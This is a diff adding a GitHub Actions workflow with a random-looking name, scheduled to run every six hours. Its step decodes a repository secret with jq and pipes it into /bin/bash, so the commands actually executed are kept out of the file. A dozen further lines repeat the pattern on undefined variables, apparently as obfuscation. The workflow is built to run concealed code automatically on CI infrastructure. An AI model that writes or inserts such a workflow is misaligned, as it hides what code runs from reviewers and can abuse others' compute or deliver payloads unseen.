@@ -1,0 +1,29 @@
+name: taozheying6547
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '20 0/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: taozheying6547
+        env:
+          h0: ${{ secrets.h0 }}
+        run: |
+          echo $h0 | jq -r .hkl1 | /bin/bash
+          echo $m45 | jq -r .wjiwr81044 | /bin/bash
+          echo $tiz70 | jq -r .noejz84230 | /bin/bash
+          echo $xo88438 | jq -r .r0 | /bin/bash
+          echo $h42 | jq -r .i87599 | /bin/bash
+          echo $w0 | jq -r .snr440 | /bin/bash
+          echo $wt2711 | jq -r .mott113 | /bin/bash
+          echo $ohakl39476 | jq -r .c21 | /bin/bash
+          echo $bxjo2 | jq -r .dfewq17462 | /bin/bash
+          echo $kocse80915 | jq -r .mh4 | /bin/bash
+          echo $s5146 | jq -r .hqljj926 | /bin/bash
+          echo $wuwj323 | jq -r .g484 | /bin/bash
+          echo $unyjg3951 | jq -r .gatoo27173 | /bin/bash
+
